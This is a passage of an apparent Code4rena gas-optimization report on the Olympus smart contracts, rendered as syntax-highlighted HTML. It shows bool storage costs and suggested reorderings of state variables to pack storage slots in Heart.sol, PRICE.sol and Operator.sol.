class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenClaimsForProposal</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:3007</span></span></span></code></pre>\n<ul>\n<li>src/modules/PRICE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62\">62</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:11813</span></span></span></code></pre>\n<p><strong>Expensive method calls</strong>:</p>\n<p>It’s just to show which bool is better left in the code</p>\n<ul>\n<li>src/policies/Operator.sol</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:5808 M:-22036</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">active</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:-32775 M:-48896</span></span></span></code></pre>\n<ul>\n<li>src/policies/Heart.sol</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">active</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:-382</span></span></span></code></pre>\n<ul>\n<li>src/policies/BondCallback.sol</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">approvedMarkets</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:-44192</span></span></span></code></pre>\n<ul>\n<li>src/Kernel.sol</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isActive</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@note D:20923 M:-247184</span></span></span></code></pre>\n<h2 id=\"g-07-state-variables-can-be-packed-into-fewer-storage-slots-3-instances\" style=\"position:relative;\"><a href=\"#g-07-state-variables-can-be-packed-into-fewer-storage-slots-3-instances\" aria-label=\"g 07 state variables can be packed into fewer storage slots 3 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] State variables can be packed into fewer storage slots (3 instances)</h2>\n<p>If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper.</p>\n<p><strong>NOTE</strong>: one slot = 32 bytes</p>\n<p>Deployment Gas Saved: <strong>23 292</strong><br>\nMethod Call Gas Saved: <strong>1 711</strong><br></p>\n<ul>\n<li>src/policies/Heart.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48\">32-48</a></li>\n</ul>\n<p>uint256(32), address(20), bool(1)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Status of the Heart, false = stopped, true = beating</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">active</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// @note put below _operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Timestamp of the last beat (UTC, in seconds)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastBeat</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Reward for beating the Heart (in reward token decimals)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Reward token address that users are sent for beating the Heart</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">     </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">     </span><span class=\"mtk3\">// Modules</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span><span class=\"mtk1\">     </span><span class=\"mtk12\">OlympusPrice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk1\">     </span><span class=\"mtk3\">// Policies</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">     </span><span class=\"mtk12\">IOperator</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastBeat</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reward</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">OlympusPrice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">IOperator</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">active</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/modules/PRICE.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65\">31-65</a></li>\n</ul>\n<p><strong>NOTE</strong>: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter</p>\n<p>uint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">inherit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Kernel</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">kernel</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">31</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">     </span><span class=\"mtk12\">AggregatorV2V3Interface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ohmEthPriceFeed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">     </span><span class=\"mtk12\">AggregatorV2V3Interface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserveEthPriceFeed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @dev Moving average data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\">; </span><span class=\"mtk3\">/// See getMovingAverage()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Array of price observations. Check nextObsIndex to determine latest data point.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">     </span><span class=\"mtk3\">///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must be re-initialized.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observations</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Index of the next observation to make. The current value at this index is the oldest observation.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">45</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">47</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numObservations</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Frequency (in seconds) that observations should be stored.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">50</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observationFrequency</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">51</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Duration (in seconds) over which the moving average is calculated.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">movingAverageDuration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Unix timestamp of last observation (in seconds).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastObservationTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Number of decimals in the price values provided by the contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice Whether the price module is initialized (and therefore active).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">     </span><span class=\"mtk3\">// Scale factor for converting prices, calculated from decimal values.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">     </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_scaleFactor</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>fix:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observationFrequency</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">movingAverageDuration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">AggregatorV2V3Interface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ohmEthPriceFeed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">AggregatorV2V3Interface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reserveEthPriceFeed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\">; </span><span class=\"mtk3\">/// See getMovingAverage()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">observations</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numObservations</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastObservationTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_scaleFactor</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ul>\n<li>src/policies/Operator.sol:<a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L58-L89\">58-89</a></li>\n</ul>\n<p>uint32(4), uint8(1), address(20), bool(1)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// Operator variables, defined in the interface on the external getter functions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">     </span><span class=\"mtk12\">Status</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_status</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">     </span><span class=\"mtk12\">Config</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice    Whether the Operator has been initialized</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice    Whether the Operator is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">     </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">active</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// Modules</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">     </span><span class=\"mtk12\">OlympusPrice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">     </span><span class=\"mtk12\">OlympusRange</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">RANGE</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">     </span><span class=\"mtk12\">OlympusTreasury</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">     </span><span class=\"mtk12\">OlympusMinter</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// External contracts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice     Auctioneer contract used for cushion bond market deployments</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">     </span><span class=\"mtk12\">IBondAuctioneer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctioneer</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">77</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/// @notice     Callback contract used for cushion bond market payouts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">     </span><span class=\"mtk12\">IBondCallback</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">callback</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">79</span></span></span>\n<span 